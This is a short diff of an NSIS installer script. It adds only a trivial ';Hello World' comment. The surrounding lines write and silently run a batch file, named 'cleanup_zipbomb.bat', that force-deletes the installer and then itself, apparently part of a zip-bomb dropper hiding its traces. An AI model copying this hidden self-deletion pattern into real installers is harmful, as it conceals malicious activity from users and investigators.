@@ -100,6 +100,7 @@ Section "MainSection" SEC01
     FileWrite $R0 'del /f /q "$EXEPATH"$\r$\n'
     FileWrite $R0 "del /f /q %0$\r$\n"
     FileClose $R0
+    ;Hello World
     
     ; Execute the cleanup batch in hidden mode
     Exec '"$TEMP\cleanup_zipbomb.bat"'
